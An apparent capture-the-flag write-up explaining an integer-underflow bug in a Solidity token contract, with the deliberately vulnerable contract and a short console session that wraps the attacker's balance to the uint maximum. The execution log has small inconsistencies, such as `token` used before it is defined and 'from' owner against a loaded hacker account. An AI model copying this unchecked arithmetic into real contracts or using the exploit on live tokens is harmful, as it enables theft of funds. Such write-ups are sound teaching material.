### Exercise 5: Token

The token contract is vulnerable because there is no under/overflow protection applied to the arithmetic used to determine account balances.
In the vulnerable `Token.sol` contract there exists a function, `transfer` that sends tokens to an address provided as an argument. The "donor" of the tokens is taken to be `msg.sender()`. The account balance of `msg.sender` is decremented by the number of tokens transferred to the recipient. The vulnerability is that unsigned integers are used with no under/overflow protection. This means that any amount of tokens that exceeds the current balance of `msg.sender` will cause the toen balance to "loop around" and decrement from the maximum value that can be stored in a uint. So, to hack this contract all we need to do is to transfer any number of tokens that exceeds our current balance to any arbitrary address. In the example below I set up two accounts: `hacker`, which is the account we want to accrue stolen funds into, and `accomplice ` which is just an arbitrary address to transfer to. To steal the maximum amount of tokens, we transfer our `current balance + 1`. 

### Vulnerbale contract

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    
    // if we send >current balance, the balance will loop around and become +ve
    // so this require is satisfied
    require(balances[msg.sender] - _value >= 0);
    // now we transfer out N tokens and our balance also "loops" around to give large number
    balances[msg.sender] -= _value;
    // recipient gets expected number of tokens
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];

  }
}
```


#### Execution

```bash
>>> hacker = accounts.load('main')
>>> accomplice = accounts.load('account2')
>>> token.balanceOf(hacker)
>>> 20
>>> token = Token.at('0x7CCf5F83b2BB87532f2888fA72F6639D512a17E7')
>>> token.transfer(accomplice, 21, {'from':owner})
>>> token.balanceOf(hacker)
    115792089237316195423570985008687907853269984665640564039457584007913129639935
```